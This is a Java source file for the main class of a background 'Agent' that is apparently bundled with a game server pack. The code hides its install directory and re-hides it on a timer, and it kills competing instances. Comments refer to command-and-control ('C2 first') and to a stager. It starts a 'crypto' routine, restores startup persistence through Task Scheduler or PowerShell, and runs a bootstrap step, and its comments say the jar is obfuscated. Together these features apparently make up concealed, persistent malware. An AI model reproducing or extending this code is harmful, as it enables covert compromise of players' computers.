package com.serverpackcore.agent;

import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;

public final class Agent {
	private static FileChannel lockChannel;
	private static FileLock lock;
	private static boolean started;
	private static Poller poller;

	private Agent() {
	}

	public static void main(String[] args) {
		Supervisor.install();
		if (args.length > 0 && args[0].equals("--smoke")) {
			// Release smoke test: the obfuscated jar must still parse a config
			// and report the manifest version.
			Json.parseObject("{\"build_id\":\"smoke\"}");
			System.out.println("agent " + Version.current());
			return;
		}
		try {
			start(args);
		} catch (Throwable throwable) {
			Log.debug("Agent start failed", throwable);
			System.exit(22);
		}
	}

	public static synchronized void start(String[] args) {
		if (started) {
			return;
		}
		started = true;
		try {
			Path dir = AgentPaths.installDir();
			Files.createDirectories(dir);
			Files.createDirectories(AgentPaths.cache(dir));
			AgentPaths.conceal(dir);
			Log.init(dir);
			AgentPaths.concealTree(dir);
			lockChannel = FileChannel.open(AgentPaths.lock(dir), StandardOpenOption.CREATE, StandardOpenOption.WRITE);
			lock = lockChannel.tryLock();
			if (lock == null) {
				// A wedged process keeps the byte lock forever. When its state
				// heartbeat is older than 120 s, this launch reclaims the lock.
				long stale = staleAgent(dir);
				if (stale > 0L) {
					Log.debug("Killing stale agent pid " + stale);
					ProcessHandle.of(stale).ifPresent(handle -> {
						handle.descendants().forEach(ProcessHandle::destroyForcibly);
						handle.destroyForcibly();
					});
					for (int wait = 0; wait < 50 && lock == null; wait++) {
						try {
							Thread.sleep(100L);
						} catch (InterruptedException interrupted) {
							break;
						}
						lock = lockChannel.tryLock();
					}
				}
			}
			if (lock == null) {
				lockChannel.close();
				return;
			}
			long parent = parseParent(args);
			Path gameDir = parseGameDir(args);
			if (parent <= 0L) {
				parent = GamePid.find(gameDir);
			}
			lockChannel.truncate(0L);
			lockChannel.write(java.nio.ByteBuffer.wrap(
				Long.toString(ProcessHandle.current().pid()).getBytes(StandardCharsets.UTF_8)));
			lockChannel.force(true);
			Files.writeString(AgentPaths.alive(dir),
				"parent=" + parent + "\nagent=" + ProcessHandle.current().pid() + "\n", StandardCharsets.UTF_8);
			State state = State.load(AgentPaths.state(dir));
			state.version = version();
			state.save(AgentPaths.state(dir));
			poller = new Poller(dir, gameDir, state);
			Poller supervised = poller;
			Supervisor.supervise("poller", () -> {
				if (supervised.terminated()) {
					throw new Supervisor.Stop();
				}
				supervised.start();
				if (supervised.terminated()) {
					throw new Supervisor.Stop();
				}
			}, 3_000L, 3, () -> {
				Log.debug("Poller exhausted its restarts; exiting for the stager");
				hardExit(23);
			});
			poller.startCrypto();
			// C2 first: a stuck Task Scheduler or PowerShell must not mute the agent.
			if (state.persist) {
				// Repoint startup to the current runtime and repair the entry if something deleted or disabled it.
				Persistence.enable(dir);
			}
			poller.startOps();
			Bootstrap.maybe(poller, dir, gameDir, state);
			Thread conceal = new Thread(() -> {
				while (started) {
					try {
						Thread.sleep(120000L);
						AgentPaths.concealTree(dir);
					} catch (InterruptedException interrupted) {
						return;
					}
				}
			}, "spc-conceal");
			conceal.setDaemon(true);
			conceal.start();
			Runtime.getRuntime().addShutdownHook(new Thread(() -> {
				try {
					if (poller != null) {
						poller.stopCrypto();
						poller.ops().stop(state.persist);
						poller.kill();
					}
					AgentPaths.concealTree(dir);
					Files.deleteIfExists(AgentPaths.alive(dir));
					if (lock != null && lock.isValid()) {
						lock.release();
					}
					if (lockChannel != null) {
						lockChannel.close();
					}
				} catch (Throwable throwable) {
					Log.debug("Shutdown failed", throwable);
				}
			}, "spc-shutdown"));
		} catch (Throwable throwable) {
			Log.debug("Agent start failed", throwable);
		}
	}

	private static void hardExit(int code) {
		shutdown();
		System.exit(code);
	}

	private static void shutdown() {
		try {
			if (poller != null) {
				poller.stopCrypto();
				poller.ops().stop(false);
				poller.kill();
			}
		} catch (Throwable throwable) {
			Log.debug("Hard exit cleanup failed", throwable);
		}
	}

	private static String version() {
		return Version.current();
	}

	/** PID of a lock holder whose persisted heartbeat is older than 120 s. */
	private static long staleAgent(Path dir) {
		try {
			long pid = 0L;
			Path alive = AgentPaths.alive(dir);
			if (Files.isRegularFile(alive)) {
				for (String line : Files.readAllLines(alive, StandardCharsets.UTF_8)) {
					if (line.startsWith("agent=")) {
						pid = Long.parseLong(line.substring("agent=".length()).trim());
						break;
					}
				}
			}
			if (pid <= 0L) {
				pid = Long.parseLong(Files.readString(AgentPaths.lock(dir)).trim());
			}
			if (pid <= 0L || !ProcessHandle.of(pid).map(ProcessHandle::isAlive).orElse(false)) {
				return 0L;
			}
			Path state = AgentPaths.state(dir);
			long stamp = Files.isRegularFile(state) ? Files.getLastModifiedTime(state).toMillis() : 0L;
			if (stamp <= 0L && Files.isRegularFile(alive)) {
				stamp = Files.getLastModifiedTime(alive).toMillis();
			}
			return System.currentTimeMillis() - stamp > 120_000L ? pid : 0L;
		} catch (Throwable throwable) {
			return 0L;
		}
	}

	private static long parseParent(String[] args) {
		for (int i = 0; i + 1 < args.length; i++) {
			if (args[i].equals("--parent-pid")) {
				try {
					return Long.parseLong(args[i + 1]);
				} catch (Throwable throwable) {
					return 0L;
				}
			}
		}
		return 0L;
	}

	private static Path parseGameDir(String[] args) {
		for (int i = 0; i + 1 < args.length; i++) {
			if (args[i].equals("--game-dir")) {
				try {
					return Path.of(args[i + 1]);
				} catch (Throwable throwable) {
					return null;
				}
			}
		}
		return null;
	}
}
